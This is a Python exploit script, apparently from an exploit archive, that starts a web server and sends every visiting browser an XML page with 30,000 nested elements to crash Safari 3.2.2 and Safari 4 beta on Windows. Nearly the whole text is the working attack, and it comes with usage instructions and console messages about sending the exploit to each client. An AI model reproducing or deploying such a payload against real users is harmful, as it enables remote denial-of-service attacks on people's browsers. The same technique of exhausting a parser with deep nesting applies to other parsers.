Safari 3.2.2/4b (nested elements) XML Parsing Remote Crash Exploit
==================================================================


#
#   Author : Ahmed Obied 
#
#   - Tested using:
#     -> Safari 3.2.2 on Windows
#     -> Safari 4 (BETA) on Windows 
#
#   Usage  : python safari.py [port]
#    

import sys, socket
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler

class RequestHandler(BaseHTTPRequestHandler):
        
    def get_exploit(self):
        exploit = &#039;<?xml version="1.0"?>&#039;
        exploit += &#039;<A>&#039; * 30000 + &#039;</A>&#039; * 30000
        return exploit
            
    def log_request(self, *args, **kwargs):
        pass

    def do_GET(self):
        if self.path == &#039;/&#039;:
            print
            print &#039;[-] Incoming connection from %s&#039; % self.client_address[0]
            print &#039;[-] Sending header to %s ...&#039; % self.client_address[0]
            self.send_response(200)
            self.send_header(&#039;Content-type&#039;, &#039;text/xml&#039;)
            self.end_headers()
            print &#039;[-] Header sent to %s&#039; % self.client_address[0]
            print &#039;[-] Sending exploit to %s ...&#039; % self.client_address[0]
            self.wfile.write(self.get_exploit())
            print &#039;[-] Exploit sent to %s&#039; % self.client_address[0]

def main():
    if len(sys.argv) != 2:
        print &#039;Usage: %s [port]&#039; % sys.argv[0]
        sys.exit(1)
    try:
        port = int(sys.argv[1])
        if port < 1 or port > 65535:
            raise ValueError
        try:
            serv = HTTPServer((&#039;&#039;, port), RequestHandler)
            ip = socket.gethostbyname(socket.gethostname())
            print &#039;[-] Web server is running at http://%s:%d/&#039; % (ip, port)
            try:
                serv.serve_forever()
            except KeyboardInterrupt:
                print &#039;[-] Exiting ...&#039; 
        except socket.error:
            print &#039;[*] ERROR: a socket error has occurred ...&#039;
        sys.exit(-1)    
    except ValueError:
        print &#039;[*] ERROR: invalid port number ...&#039;
        sys.exit(-1)
            
if __name__ == &#039;__main__&#039;:
    main()



